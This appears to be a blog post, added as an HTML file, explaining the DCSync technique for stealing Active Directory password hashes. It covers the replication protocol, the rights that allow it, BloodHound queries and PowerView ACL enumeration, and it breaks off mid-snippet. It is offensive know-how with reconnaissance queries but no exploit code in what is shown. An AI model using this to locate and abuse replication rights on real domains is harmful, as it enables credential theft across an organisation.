@@ -1,0 +1,1331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DCSync攻击深度专题：如何悄然窃取Active Directory密码哈希 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>DCSync攻击深度专题：如何悄然窃取Active Directory密码哈希</h1>
+<time>2026-08-01</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: dcsync攻击深度专题如何悄然窃取active-directory密码哈希</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-引言为什么-dcsync-是-ad-安全的幽灵">1. 引言：为什么 DCSync 是 AD 安全的"幽灵"</a></li>
+<li><a href="#2-ad-复制协议深度解析">2. AD 复制协议深度解析</a></li>
+<li><a href="#21-域控制器复制架构总览">2.1 域控制器复制架构总览</a></li>
+<li><a href="#22-ms-drsr-协议与-rpc-绑定">2.2 MS-DRSR 协议与 RPC 绑定</a></li>
+<li><a href="#23-idl_drsbind--idl_drsgetncchanges--idl_drsunbind-完整流程">2.3 IDL_DRSBind → IDL_DRSGetNCChanges → IDL_DRSUnbind 完整流程</a></li>
+<li><a href="#24-关键-drsuapi-函数表">2.4 关键 DRSUAPI 函数表</a></li>
+<li><a href="#3-dcsync-权限模型">3. DCSync 权限模型</a></li>
+<li><a href="#31-能执行-dcsync-的权限与组">3.1 能执行 DCSync 的权限与组</a></li>
+<li><a href="#32-为什么-exchange--ad-connect-拥有此权限">3.2 为什么 Exchange / AD Connect 拥有此权限</a></li>
+<li><a href="#33-bloodhound-自定义-cypher-查询">3.3 BloodHound 自定义 Cypher 查询</a></li>
+<li><a href="#4-攻击实战">4. 攻击实战</a></li>
+<li><a href="#41-mimikatz-完整命令序列与输出分析">4.1 Mimikatz 完整命令序列与输出分析</a></li>
+<li><a href="#42-impacket-secretsdumppy-多参数模式">4.2 Impacket secretsdump.py 多参数模式</a></li>
+<li><a href="#43-从-dcsync-到-golden-ticket-完整攻击链">4.3 从 DCSync 到 Golden Ticket 完整攻击链</a></li>
+<li><a href="#44-简化版-dcsync-python-poc">4.4 简化版 DCSync Python PoC</a></li>
+<li><a href="#5-提取数据深度分析">5. 提取数据深度分析</a></li>
+<li><a href="#51-ntlm-哈希的计算原理与用途">5.1 NTLM 哈希的计算原理与用途</a></li>
+<li><a href="#52-kerberos-密钥的类型与用途">5.2 Kerberos 密钥的类型与用途</a></li>
+<li><a href="#53-补充凭据结构">5.3 补充凭据结构</a></li>
+<li><a href="#54-提取数据类型与攻击用途对照表">5.4 提取数据类型与攻击用途对照表</a></li>
+<li><a href="#6-检测与防御">6. 检测与防御</a></li>
+<li><a href="#61-event-id-4662-检测规则">6.1 Event ID 4662 检测规则</a></li>
+<li><a href="#62-非-dc-主机的-drsuapi-调用检测">6.2 非 DC 主机的 DRSUAPI 调用检测</a></li>
+<li><a href="#63-dcsync-权限最小化方案">6.3 DCSync 权限最小化方案</a></li>
+<li><a href="#64-ad-tiered-model-分层防御架构">6.4 AD Tiered Model 分层防御架构</a></li>
+<li><a href="#7-总结">7. 总结</a></li>
+</ul>
+<hr />
+<h2>1. 引言：为什么 DCSync 是 AD 安全的"幽灵"</h2>
+<p>DCSync 是 Mimikatz 于 2015 年 8 月引入的一项功能，其本质是<strong>模拟域控制器的复制行为</strong>，通过域复制协议 MS-DRSR（Directory Replication Service Remote Protocol）远程提取域内任意用户的密码哈希。它在 MITRE ATT&amp;CK 框架中对应 <strong>T1003.006 (OS Credential Dumping: DCSync)</strong>。</p>
+<p>DCSync 的可怕之处在于其"静默性"：</p>
+<ul>
+<li><strong>不需要在域控上执行代码</strong>——攻击者完全在域外操作；</li>
+<li><strong>不需要访问 LSASS 进程</strong>——绕过了 Credential Guard、EDR 对 LSASS 的监控；</li>
+<li><strong>不需要读取 NTDS.dit 文件</strong>——不触发文件访问审计；</li>
+<li><strong>只需要一个拥有"Replicating Directory Changes"权限的账户</strong>——这类账户在大型企业中远不止 Domain Admins。</li>
+</ul>
+<p>这意味着传统的"保护域控"防御思路在 DCSync 面前会出现致命盲区：攻击者只要拿到一个 Exchange 服务账户、一个 AD Connect 同步账户，甚至是一个被错误委派了复制权限的普通账户，就能在<strong>不触碰任何域控</strong>的情况下，把整个域的密码哈希打包带走。</p>
+<p>本文将从 MS-DRSR 协议底层开始，逐层拆解 DCSync 的工作原理、权限模型、攻击实战与检测防御。</p>
+<hr />
+<h2>2. AD 复制协议深度解析</h2>
+<h3>2.1 域控制器复制架构总览</h3>
+<p>Active Directory 是一个多主复制（multi-master）的分布式数据库。每个域控制器（DC）都持有一份可写的目录数据副本，DC 之间通过<strong>复制拓扑</strong>定期同步变更。在站点内（intra-site），复制默认每 <strong>15 秒</strong>触发一次（通过 KCC 自动生成连接）；在站点间（inter-site），复制间隔按站点链接配置（默认 15 分钟到 180 分钟）。</p>
+<div class="highlight"><pre><span></span><code>                    ┌─────────────────────────────────────────────────┐
+                    │              Active Directory 域 corp.local       │
+                    │                                                   │
+                    │   ┌──────────────┐         ┌──────────────┐       │
+                    │   │   DC01 (PDC)  │◄───────►│   DC02 (GC)  │       │
+                    │   │  NTDS.dit    │  DRSUAPI │  NTDS.dit   │       │
+                    │   │  LSASS       │  RPC     │  LSASS      │       │
+                    │   │  SYSVOL      │◄───────►│  SYSVOL     │       │
+                    │   └──────┬───────┘         └──────┬───────┘       │
+                    │          │                        │               │
+                    │          │  复制拓扑 (KCC)        │               │
+                    │          │                        │               │
+                    │   ┌──────▼───────┐         ┌──────▼───────┐       │
+                    │   │   DC03 (RODC) │◄───────►│   DC04       │       │
+                    │   │  只读副本     │  单向    │  可写副本    │       │
+                    │   └──────────────┘         └──────────────┘       │
+                    └─────────────────────────────────────────────────┘
+                                       │
+                                       │ MS-DRSR / DRSUAPI (RPC)
+                                       │ 绑定 UUID: {E3514235-4B06-11D1-AB04-00C04FC2DCD2}
+                                       ▼
+                    ┌─────────────────────────────────────────────────┐
+                    │         攻击者工作站 (非域控)                      │
+                    │                                                   │
+                    │   持有 Replicating Directory Changes 权限的账户    │
+                    │   ↓ Mimikatz / Impacket                          │
+                    │   模拟 DC 身份发起 IDL_DRSGetNCChanges 请求        │
+                    │   ↓                                               │
+                    │   接收压缩的 NC 变更数据，解析出密码哈希            │
+                    └─────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>关键点在于：<strong>MS-DRSR 协议本身不验证调用者是否真的是域控</strong>。它只验证调用者是否拥有复制所需的权限（通过 ACL 检查）。这就是 DCSync 得以成立的协议层根因——权限即身份。</p>
+<h3>2.2 MS-DRSR 协议与 RPC 绑定</h3>
+<p>MS-DRSR 建立在 MS-RPCE（DCE/RPC）之上。域控在启动时通过 RPC 端点映射器（Endpoint Mapper，端口 135）注册 DRSUAPI 接口，其接口 UUID 为：</p>
+<div class="highlight"><pre><span></span><code>{E3514235-4B06-11D1-AB04-00C04FC2DCD2}
+</code></pre></div>
+
+<p>客户端（正常情况下是另一台 DC）通过以下步骤建立连接：</p>
+<ol>
+<li><strong>RPC Bind</strong>：连接到目标 DC 的 135 端口，解析 DRSUAPI 接口的动态端口（通常是 49152-65535 的高位动态端口，或通过 <code>ncacn_ip_tcp</code> 直连）。</li>
+<li><strong>认证</strong>：使用 Kerberos（或 NTLM）认证，服务主体名为 <code>GC/</code> 或 <code>E3514235-4B06-11D1-AB04-00C04FC2DCD2/&lt;DC主机名&gt;</code>，这是 DRSUAPI 特有的 SPN 格式。</li>
+<li><strong>调用 DRSUAPI 函数</strong>：执行复制握手和数据拉取。</li>
+</ol>
+<p>DCSync 攻击者在这一步完全复用正常的 RPC 绑定流程，唯一区别是攻击者不是 DC，但其账户拥有复制权限。</p>
+<h3>2.3 IDL_DRSBind → IDL_DRSGetNCChanges → IDL_DRSUnbind 完整流程</h3>
+<p>DCSync 的核心是调用三个 DRSUAPI 函数，模拟一次完整的域复制会话：</p>
+<div class="highlight"><pre><span></span><code><span class="err">攻击者</span><span class="w">                          </span><span class="err">目标域控</span><span class="w"> </span><span class="p">(</span><span class="n">DC01</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mf">1.</span><span class="w"> </span><span class="n">RPC</span><span class="w"> </span><span class="n">Bind</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">DRSUAPI</span><span class="w">          </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">UUID</span><span class="o">:</span><span class="w"> </span><span class="n">E3514235</span><span class="o">-</span><span class="mi">4</span><span class="n">B06</span><span class="o">-</span><span class="mi">11</span><span class="n">D1</span><span class="o">-</span><span class="p">...)</span><span class="w">  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│─────────────────────────────────►│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">验证调用者权限</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">Replicating</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">Changes</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mf">2.</span><span class="w"> </span><span class="n">IDL_DRSBind</span><span class="w">                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">puuidClientDsa</span><span class="p">,</span><span class="w"> </span><span class="n">pccrede</span><span class="w"> </span><span class="n">ntial</span><span class="p">)</span><span class="err">│</span>
+<span class="w">  </span><span class="err">│─────────────────────────────────►│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">创建</span><span class="w"> </span><span class="n">DRS</span><span class="w"> </span><span class="err">会话上下文</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">返回</span><span class="w"> </span><span class="n">hDrs</span><span class="w"> </span><span class="p">(</span><span class="err">会话句柄</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│◄─────────────────────────────────│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mf">3.</span><span class="w"> </span><span class="n">IDL_DRSGetNCChanges</span><span class="w">          </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">hDrs</span><span class="p">,</span><span class="w"> </span><span class="n">dwInVersion</span><span class="p">,</span><span class="w">            </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">pmsgIn</span><span class="o">-&gt;</span><span class="n">uuidDsaObjDest</span><span class="p">,</span><span class="w">       </span><span class="err">│</span><span class="w">  </span><span class="err">请求指定</span><span class="w"> </span><span class="n">NC</span><span class="w"> </span><span class="p">(</span><span class="err">如</span><span class="w"> </span><span class="n">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="kr">local</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">pmsgIn</span><span class="o">-&gt;</span><span class="n">uuidInvocIdSrc</span><span class="p">,</span><span class="w">       </span><span class="err">│</span><span class="w">  </span><span class="err">指定源</span><span class="w"> </span><span class="n">DSA</span><span class="w"> </span><span class="err">调用</span><span class="w"> </span><span class="n">ID</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">pmsgIn</span><span class="o">-&gt;</span><span class="n">pNc</span><span class="p">,</span><span class="w">                  </span><span class="err">│</span><span class="w">  </span><span class="err">指定目标对象</span><span class="w"> </span><span class="p">(</span><span class="err">如</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">krbtgt</span><span class="p">,...)</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">pmsgIn</span><span class="o">-&gt;</span><span class="n">usnvecFrom</span><span class="p">)</span><span class="w">           </span><span class="err">│</span><span class="w">  </span><span class="err">指定</span><span class="w"> </span><span class="n">USN</span><span class="w"> </span><span class="err">起始点</span><span class="w"> </span><span class="p">(</span><span class="err">从</span><span class="mi">0</span><span class="err">开始</span><span class="o">=</span><span class="err">全量</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│─────────────────────────────────►│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">根据</span><span class="w"> </span><span class="n">USN</span><span class="w"> </span><span class="err">向量计算变更</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">序列化对象属性</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">包含</span><span class="w"> </span><span class="n">secretAttribute</span><span class="w"> </span><span class="p">(</span><span class="err">密码哈希</span><span class="p">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="n">REPLENTIN</span><span class="w"> </span><span class="err">加密</span><span class="o">/</span><span class="err">压缩</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">返回</span><span class="w"> </span><span class="n">pmsgOut</span><span class="w">                    </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">REPLENTIN</span><span class="w"> </span><span class="err">结构</span><span class="p">,</span><span class="w">                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="err">含</span><span class="w"> </span><span class="n">ENTINF</span><span class="w"> </span><span class="err">对象属性列表</span><span class="p">)</span><span class="w">         </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│◄─────────────────────────────────│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mf">4.</span><span class="w"> </span><span class="err">解析</span><span class="w"> </span><span class="n">REPLENTIN</span><span class="w">               </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">提取</span><span class="w"> </span><span class="n">unicodePwd</span><span class="w"> </span><span class="p">(</span><span class="n">NTLM</span><span class="w"> </span><span class="nf">hash</span><span class="p">)</span><span class="w">     </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">提取</span><span class="w"> </span><span class="n">supplementalCredentials</span><span class="w">    </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">提取</span><span class="w"> </span><span class="n">kerberos</span><span class="w"> </span><span class="n">keys</span><span class="w">              </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mf">5.</span><span class="w"> </span><span class="n">IDL_DRSUnbind</span><span class="w">                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">hDrs</span><span class="p">)</span><span class="w">                          </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│─────────────────────────────────►│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span><span class="w">  </span><span class="err">销毁会话上下文</span>
+<span class="w">  </span><span class="err">│◄─────────────────────────────────│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                  </span><span class="err">│</span>
+</code></pre></div>
+
+<p><strong>IDL_DRSGetNCChanges</strong> 是整个攻击的关键。它的输入参数 <code>pmsgIn</code> 包含一个 <code>USN_VECTOR</code>，指定从哪个 USN（Update Sequence Number）开始拉取变更。DCSync 攻击将 <code>usnFrom</code> 设为 0，意味着请求从"时间开端"开始的所有变更，即<strong>全量数据</strong>。目标 DC 会将请求对象（如 <code>CN=krbtgt,CN=Users,DC=corp,DC=local</code>）的全部属性（包括机密属性 <code>unicodePwd</code>、<code>dBCSPwd</code>、<code>kerberos-*</code>、<code>supplementalCredentials</code>）打包进 <code>REPLENTIN</code> 结构返回。</p>
+<p>正常复制中，机密属性的传输有额外保护（RPC 级别的认证隐私 sealing），但只要通过了权限检查，这些保护对攻击者并不构成障碍——攻击者本身就是认证会话的一方。</p>
+<h3>2.4 关键 DRSUAPI 函数表</h3>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+<th>DCSync 中的角色</th>
+<th>调用频率</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>IDL_DRSBind</code></td>
+<td>建立复制会话，返回会话句柄 hDrs</td>
+<td>必需，初始化会话</td>
+<td>每次攻击 1 次</td>
+</tr>
+<tr>
+<td><code>IDL_DRSUnbind</code></td>
+<td>关闭复制会话，释放句柄</td>
+<td>必需，清理痕迹</td>
+<td>每次攻击 1 次</td>
+</tr>
+<tr>
+<td><code>IDL_DRSGetNCChanges</code></td>
+<td>请求 NC 的增量/全量变更</td>
+<td><strong>核心函数</strong>，拉取密码哈希</td>
+<td>每用户 1 次或批量</td>
+</tr>
+<tr>
+<td><code>IDL_DRSReplicaSync</code></td>
+<td>触发源 DC 向目标推送变更</td>
+<td>DCSync 不直接使用（拉模型）</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>IDL_DRSUpdateRefs</code></td>
+<td>更新复制引用</td>
+<td>不使用</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>IDL_DRSCrackNames</code></td>
+<td>名称格式转换</td>
+<td>辅助，解析用户 DN</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><code>IDL_DRSDomainControllerInfo</code></td>
+<td>查询 DC 信息</td>
+<td>辅助，枚举 DC</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><code>IDL_DRSGetMemberships</code></td>
+<td>查询组成员关系</td>
+<td>不使用</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>IDL_DRSVerifyNames</code></td>
+<td>验证对象名</td>
+<td>不使用</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>IDL_DRSGetReplInfo</code></td>
+<td>查询复制元数据</td>
+<td>辅助，获取 invocationId</td>
+<td>可选</td>
+</tr>
+<tr>
+<td><code>IDL_DRSMoveObject</code></td>
+<td>移动对象</td>
+<td>不使用</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<p>DCSync 的精简之处在于：它只用了<strong>三个函数</strong>（Bind / GetNCChanges / Unbind）就完成了整个攻击，这是对协议"最小可用子集"的精准利用。</p>
+<hr />
+<h2>3. DCSync 权限模型</h2>
+<h3>3.1 能执行 DCSync 的权限与组</h3>
+<p>DCSync 的本质是执行目录复制。在 AD 中，复制权限通过域 NC（Naming Context）根节点上的 ACL 控制。以下权限/组成员身份可以执行 DCSync：</p>
+<table>
+<thead>
+<tr>
+<th>权限 / 组</th>
+<th>范围</th>
+<th style="text-align: center;">是否包含机密属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain Admins</td>
+<td>当前域</td>
+<td style="text-align: center;">是</td>
+<td>域内最高权限，默认拥有</td>
+</tr>
+<tr>
+<td>Enterprise Admins</td>
+<td>整个森林</td>
+<td style="text-align: center;">是</td>
+<td>森林级管理员，默认拥有</td>
+</tr>
+<tr>
+<td>BUILTIN\Administrators (域控本地)</td>
+<td>单台 DC</td>
+<td style="text-align: center;">是</td>
+<td>DC 本地管理员组</td>
+</tr>
+<tr>
+<td>Replicating Directory Changes</td>
+<td>域 NC 根</td>
+<td style="text-align: center;">否</td>
+<td>能复制普通属性，不含密码</td>
+</tr>
+<tr>
+<td>Replicating Directory Changes All</td>
+<td>域 NC 根</td>
+<td style="text-align: center;"><strong>是</strong></td>
+<td>能复制全部属性，<strong>含密码哈希</strong></td>
+</tr>
+<tr>
+<td>Replicating Directory Changes in Filtered Set</td>
+<td>RODC 过滤集</td>
+<td style="text-align: center;">部分</td>
+<td>RODC 复制专用，范围受限</td>
+</tr>
+<tr>
+<td>Exchange Servers 组 (旧版)</td>
+<td>当前域</td>
+<td style="text-align: center;">是</td>
+<td>Exchange 2000-2010 安装时授予</td>
+</tr>
+<tr>
+<td>Exchange Windows Permissions 组</td>
+<td>当前域</td>
+<td style="text-align: center;">是</td>
+<td>Exchange 安装授予，含 WriteDacl</td>
+</tr>
+<tr>
+<td>AD Connect 同步账户 (MSOL_)</td>
+<td>当前域</td>
+<td style="text-align: center;">是</td>
+<td>目录同步需要复制权限</td>
+</tr>
+<tr>
+<td>管理员手动委派的账户</td>
+<td>当前域</td>
+<td style="text-align: center;">取决于委派</td>
+<td>错误配置导致权限蔓延</td>
+</tr>
+</tbody>
+</table>
+<p>需要特别说明的是：仅有 <code>Replicating Directory Changes</code>（不含 All）<strong>不足以</strong>提取密码哈希。要读取 <code>unicodePwd</code>、<code>dBCSPwd</code> 等机密属性，必须拥有 <code>Replicating Directory Changes All</code> 权限。这两个权限在 ACL 中对应两个不同的 GUID：</p>
+<ul>
+<li><code>DS-Replication-Get-Changes</code>: <code>1131f6aa-9c07-11d1-f79f-00c04fc2dab2</code></li>
+<li><code>DS-Replication-Get-Changes-All</code>: <code>1131f6ad-9c07-11d1-f79f-00c04fc2dab2</code></li>
+</ul>
+<h3>3.2 为什么 Exchange / AD Connect 拥有此权限</h3>
+<p>这是 DCSync 攻击面中最容易被忽视、却最危险的环节。</p>
+<p><strong>Exchange Server</strong>：Exchange 在安装时（尤其是 Exchange 2000-2013），安装向导会运行 <code>setup /PrepareAD</code>，该过程会修改域 NC 根的 ACL，授予 <code>Exchange Servers</code> 组和 <code>Exchange Windows Permissions</code> 组 <code>Replicating Directory Changes All</code> 权限。原因是 Exchange 需要读取全局地址列表（GAL）中的所有用户属性，并通过其信息存储服务缓存用户信息。更危险的是，<code>Exchange Windows Permissions</code> 组还拥有 <code>WriteDacl</code> 权限，这意味着该组成员可以<strong>修改域 NC 的 ACL</strong>，进而给自己授予任意权限——这就是著名的 <strong>Exchange 高危权限滥用路径</strong>（Shadow Admin）。</p>
+<p><strong>Azure AD Connect</strong>：AD Connect 的同步服务账户（通常命名为 <code>MSOL_xxxx</code>）需要读取本地 AD 的所有用户、组、联系人属性以同步到 Azure AD。安装向导会授予该账户 <code>Replicating Directory Changes</code> 和 <code>Replicating Directory Changes All</code> 权限。如果攻击者拿下 AD Connect 服务器，即可获取该账户凭据，进而对本地 AD 执行 DCSync。</p>
+<p>这两个案例说明：<strong>DCSync 的攻击面远不止 Domain Admins</strong>。在许多企业中，Exchange 管理员和 AD Connect 服务器的本地管理员，实际上等于域管理员。</p>
+<h3>3.3 BloodHound 自定义 Cypher 查询</h3>
+<p>BloodHound 默认不包含 DCSync 边的收集，但可以通过自定义 Cypher 查询找出"非 DA 用户到 DCSync 权限的路径"。</p>
+<p>以下 Cypher 查询找出所有拥有 DCSync 权限（GetChanges/GetChangesAll）的用户，并追溯其到达路径：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 查询1：找出所有拥有 DCSync 所需权限的主体</span>
+<span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">-[</span><span class="n">r</span><span class="p">:</span><span class="n">GenericAll</span><span class="p">|</span><span class="n">WriteDacl</span><span class="p">|</span><span class="n">WriteProperty</span><span class="p">|</span><span class="n">Owns</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">d</span><span class="p">:</span><span class="n">Domain</span><span class="p">)</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="p">&lt;&gt;</span><span class="w"> </span><span class="n">d</span>
+<span class="w">  </span><span class="n">AND</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="k">any</span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="o">[</span><span class="s">&#39;GetChanges&#39;</span><span class="p">,</span><span class="s">&#39;GetChangesAll&#39;</span><span class="o">]</span><span class="p">)</span>
+<span class="w">    </span><span class="n">OR</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">isacl</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="k">true</span>
+<span class="w">  </span><span class="p">)</span>
+<span class="k">OPTIONAL</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">GenericAll</span><span class="p">|</span><span class="n">WriteDacl</span><span class="p">|</span><span class="n">Owns</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
+<span class="k">RETURN</span><span class="w"> </span><span class="n">n</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">labels</span><span class="p">(</span><span class="n">n</span><span class="p">),</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="m">50</span>
+</code></pre></div>
+
+<p>更精准的查询（基于 BloodHound 4.x+ 的 ACL 边类型）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 查询2：从任意用户出发，到 DCSync 权限的最短路径</span>
+<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">shortestPath</span><span class="p">(</span>
+<span class="w">  </span><span class="p">(</span><span class="n">u</span><span class="p">:</span><span class="n">User</span><span class="w"> </span><span class="p">{</span><span class="n">enabled</span><span class="p">:</span><span class="k">true</span><span class="p">})</span><span class="o">-[</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">|</span><span class="n">GenericAll</span><span class="p">|</span><span class="n">GenericWrite</span><span class="p">|</span><span class="n">WriteDacl</span><span class="p">|</span><span class="n">WriteOwner</span><span class="p">|</span><span class="n">Owns</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="m">15</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">d</span><span class="p">:</span><span class="n">Domain</span><span class="p">)</span>
+<span class="p">)</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="p">&lt;&gt;</span><span class="w"> </span><span class="n">d</span>
+<span class="w">  </span><span class="n">AND</span><span class="w"> </span><span class="k">any</span><span class="p">(</span><span class="n">r</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="n">relationships</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span>
+<span class="w">    </span><span class="n">r</span><span class="p">.</span><span class="n">isacl</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span>
+<span class="w">    </span><span class="s">&#39;GetChangesAll&#39;</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="n">coalesce</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">memberrights</span><span class="p">,</span><span class="w"> </span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">OR</span>
+<span class="w">    </span><span class="s">&#39;GetChanges&#39;</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="n">coalesce</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">memberrights</span><span class="p">,</span><span class="w"> </span><span class="o">[]</span><span class="p">)</span>
+<span class="w">  </span><span class="p">)</span>
+<span class="k">RETURN</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="m">25</span>
+</code></pre></div>
+
+<p>实战中更稳妥的做法是结合 PowerView / SharpView 先枚举 ACL：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># PowerView: 查找域 NC 根上拥有复制权限的对象</span>
+<span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;DC=corp,DC=local&quot;</span> <span class="p">|</span> 
+  <span class="nb">Where-Object</span> <span class="p">{</span>
+    <span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s2">&quot;ExtendedRight&quot;</span> <span class="o">-and</span>
+    <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-eq</span> <span class="s2">&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dab2&quot;</span> <span class="o">-or</span>
+     <span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-eq</span> <span class="s2">&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dab2&quot;</span><span class="p">)</span>
